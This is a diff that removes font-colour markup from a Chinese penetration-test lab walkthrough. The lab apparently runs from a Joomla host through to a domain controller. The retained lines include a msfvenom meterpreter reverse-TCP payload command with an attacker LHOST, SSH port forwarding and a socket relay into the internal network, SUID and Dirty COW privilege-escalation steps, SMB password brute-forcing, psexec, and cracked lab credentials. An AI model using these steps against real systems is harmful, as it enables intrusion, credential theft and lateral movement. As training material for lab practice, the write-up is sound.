@@ -38,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
 
 
 
-## <font style="color:rgb(79, 79, 79);">扫描</font><font style="color:rgb(252, 85, 49);"> cms</font>
+## 扫描 cms
 `joomscan -u http://192.168.242.92/`
 
 
@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
 
 1、Joomla 3.9.12
 
-_<font style="color:rgb(217, 48, 37);">Joomla</font>_<font style="color:rgb(71, 71, 71);">是一款开源的内容管理系统（CMS），使用PHP编写，支持MySQL、MSSQL和PostgreSQL等多种数据库系统。</font>
+_Joomla_是一款开源的内容管理系统（CMS），使用PHP编写，支持MySQL、MSSQL和PostgreSQL等多种数据库系统。
 
 2、
 
@@ -714,26 +714,26 @@ Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC
 
 ```
 
-<font style="color:rgb(77, 77, 77);"></font>
-
-> ### <font style="color:rgb(51, 51, 51);">Linux 提权</font>
-> <font style="color:rgb(51, 51, 51);">1、内核提权(脏牛肉提权）</font>
->
-> <font style="color:rgb(51, 51, 51);">2、suid提权</font>
->
-> <font style="color:rgb(51, 51, 51);">3、sudo提权</font>
->
-> <font style="color:rgb(51, 51, 51);">4、数据库提权</font>
->
-> `<font style="color:rgb(51, 51, 51);">sudo -l</font>`<font style="color:rgb(51, 51, 51);"> 查看特权命令 </font>
->
-> <font style="color:rgb(51, 51, 51);">不能使用sudo命令</font>
->
 
 
+> ### Linux 提权
+> 1、内核提权(脏牛肉提权）
+>
+> 2、suid提权
+>
+> 3、sudo提权
+>
+> 4、数据库提权
+>
+> `sudo -l` 查看特权命令 
+>
+> 不能使用sudo命令
+>
 
-#### <font style="color:rgb(51, 51, 51);">suid提权，</font>
-<font style="color:rgb(51, 51, 51);">通过命令</font>`<font style="color:rgb(51, 51, 51);">find / -perm -4000 2>/dev/null</font>`<font style="color:rgb(51, 51, 51);">查看是否具有root权限的命令</font>
+
+
+#### suid提权，
+通过命令`find / -perm -4000 2>/dev/null`查看是否具有root权限的命令
 
 ```bash
 [wwwuser@localhost ~]$ sudo -l
@@ -762,23 +762,23 @@ Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC
 [wwwuser@localhost ~]$
 ```
 
-#### <font style="color:rgb(51, 51, 51);">内核提权</font>
-<font style="color:rgb(51, 51, 51);">脏牛肉提权（CVE-2016-5195）</font>
+#### 内核提权
+脏牛肉提权（CVE-2016-5195）
 
 [Linux脏牛(CVE-2016-5195)提权保姆级教程](https://blog.csdn.net/weixin_68408599/article/details/132332072)
 
 [脏牛-Linux内核提权 _](https://www.cnblogs.com/Junglezt/p/15548392.html)
 
-> <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">dirty.c内置在了kali中，使用命令</font>`**<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">searchsploit dirty</font>**`<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">可以搜索</font>
+> dirty.c内置在了kali中，使用命令`**searchsploit dirty**`可以搜索
 >
 > <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151705440.png)
 >
 > 
 >
-> <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">低权限的用户能够在本地进行提权获取管理员权限</font>
+> 低权限的用户能够在本地进行提权获取管理员权限
 >
-> <font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">大概原理，Linux内核子系统在写入时产生了条件竞争。条件竞争就是程序在处理的时候异常，可能会让程序报错，这样让攻击者就有机可乘。</font>
+> 大概原理，Linux内核子系统在写入时产生了条件竞争。条件竞争就是程序在处理的时候异常，可能会让程序报错，这样让攻击者就有机可乘。
 >
 
 
@@ -1006,7 +1006,7 @@ start vulscan
 
 
 
-### <font style="color:rgb(79, 79, 79);">使用ssh转发打通内网(正向)</font>
+### 使用ssh转发打通内网(正向)
 ```bash
 接下来通过ssh转发功能打通内网(用ssh而不用其他工具是因为目标自带且稳定)
 
@@ -1030,10 +1030,10 @@ ssh -fgN -L 3333:192.168.93.30:445 localhost
 
 
 
-### <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">上线 msf</font>
-<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">首先使用msf生成一个shellcode：</font>
+### 上线 msf
+首先使用msf生成一个shellcode：
 
-`<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.188.104 LPORT=7890 -f elf > mshell.elf</font>`
+`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.188.104 LPORT=7890 -f elf > mshell.elf`
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706761.png)
@@ -1215,7 +1215,7 @@ run
 
 
 
-### <font style="color:rgb(79, 79, 79);">爆破smb登陆密码</font>
+### 爆破smb登陆密码
 ```bash
 msfconsole
  
@@ -1316,12 +1316,12 @@ administrator:123qwe!ASD
 
 
 
-<font style="color:rgb(77, 77, 77);">接下来使用use exploit/windows/smb/psexec模块来获取会话</font>
+接下来使用use exploit/windows/smb/psexec模块来获取会话
 
 
 
 ### 使用py脚本打通内网(反向)
-<font style="color:rgb(77, 77, 77);">上传一个转发脚本到web主机</font>
+上传一个转发脚本到web主机
 
 ```python
 import socket
@@ -1413,7 +1413,7 @@ python sock.py 0.0.0.0 6666 192.168.188.104 6666 &
 
 
 
-<font style="color:rgb(77, 77, 77);">然后回到攻击机开始配置攻击模块        新开一个终端执行以下命令</font>
+然后回到攻击机开始配置攻击模块        新开一个终端执行以下命令
 
 ```python
 msfconsole
@@ -1510,7 +1510,7 @@ meterpreter >
 
 
 
-<font style="color:rgb(77, 77, 77);">回车之前先在开一个终端执行下方命令来接收会话</font>
+回车之前先在开一个终端执行下方命令来接收会话
 
 ```python
 msfconsole
@@ -1596,12 +1596,12 @@ meterpreter >
 
 
 
-### <font style="color:rgb(79, 79, 79);">查找域控</font>
-<font style="color:rgb(77, 77, 77);">接下来收集信息确认域控ip</font>
+### 查找域控
+接下来收集信息确认域控ip
 
-<font style="color:rgb(77, 77, 77);">shell</font>
+shell
 
-<font style="color:rgb(77, 77, 77);">ipconfig /all</font>
+ipconfig /all
 
 ```bash
 meterpreter > shell
@@ -1669,9 +1669,9 @@ C:\Windows\system32>
 
 
 
-<font style="color:rgb(77, 77, 77);">得到域控ip是192.168.93.10跟之前fscan扫描出来的结果一样，也开了445端口，但是密码却不是这两台主机的，所以还是依旧爆破</font>
+得到域控ip是192.168.93.10跟之前fscan扫描出来的结果一样，也开了445端口，但是密码却不是这两台主机的，所以还是依旧爆破
 
-<font style="color:rgb(77, 77, 77);"></font>
+
 
 ```bash
 msfconsole
@@ -1691,13 +1691,13 @@ set STOP_ON_SUCCESS
 run
 ```
 
-<font style="color:rgb(77, 77, 77);"></font>
 
-<font style="color:rgb(77, 77, 77);">得到密码 zxcASDqw123!!</font>
 
-<font style="color:rgb(77, 77, 77);"></font>
+得到密码 zxcASDqw123!!
 
-### <font style="color:rgb(79, 79, 79);">拿下域控</font>
+
+
+### 拿下域控
 ```bash
 msfconsole
  
@@ -1789,9 +1789,9 @@ meterpreter >
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706195.png)
 
-<font style="color:rgb(77, 77, 77);"></font>
 
-### <font style="color:rgb(79, 79, 79);">拿下ubuntu</font>
+
+### 拿下ubuntu
 
 
 ### ssh 登录
